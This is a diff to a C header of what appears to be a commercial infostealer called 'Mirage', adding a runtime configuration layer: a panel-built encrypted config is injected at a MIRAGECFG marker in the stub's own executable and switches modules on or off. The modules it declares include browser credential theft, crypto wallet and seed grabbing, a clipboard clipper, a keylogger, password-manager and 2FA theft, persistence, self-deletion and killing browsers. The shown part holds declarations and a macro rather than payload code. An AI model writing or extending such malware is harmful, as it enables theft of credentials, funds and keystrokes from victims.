@@ -193,6 +193,45 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
     #define dbg_printf(...) ((void)0)
 #endif
 
+/* ═══════ Runtime Config Overrides ═══════════════════════════ */
+/*
+ * When a build is created via the panel, BuildConfig JSON is injected
+ * at the MIRAGECFG marker. The stub decrypts it at startup and fills
+ * g_cfg_* globals. Modules then use ENABLED(feature) which checks
+ * the runtime config first, falling back to compile-time #define.
+ */
+
+/* Runtime config globals — set at startup from MIRAGECFG, zero = use compile-time */
+extern int g_cfg_loaded;       /* 1 if runtime config was parsed */
+
+/* Module flags — 0=disabled, 1=enabled, -1=not set (use compile-time) */
+extern int g_cfg_chromium;
+extern int g_cfg_firefox;
+extern int g_cfg_wallets;
+extern int g_cfg_wifi;
+extern int g_cfg_screenshot;
+extern int g_cfg_clipboard;
+extern int g_cfg_keylogger;
+extern int g_cfg_seed_grabber;
+extern int g_cfg_clipper;
+extern int g_cfg_gaming;
+extern int g_cfg_vpn;
+extern int g_cfg_twofa;
+extern int g_cfg_passman;
+extern int g_cfg_persistence;
+extern int g_cfg_self_delete;
+extern int g_cfg_cdp_grab;
+extern int g_cfg_raw_export;
+extern int g_cfg_kill_browsers;
+extern int g_cfg_anti_duplicate;
+
+/* Runtime config parser — reads MIRAGECFG from own PE image */
+int config_parse_runtime(void);
+
+/* Macro: check runtime first, fall back to compile-time define */
+#define CFG_ENABLED(flag) (g_cfg_loaded ? (g_cfg_##flag > 0) : 1)
+
+
 /* ═══════ Test Mode — skip blocking checks for smoke testing ═══ */
 /* #define ZIALFI_TEST_MODE */
 
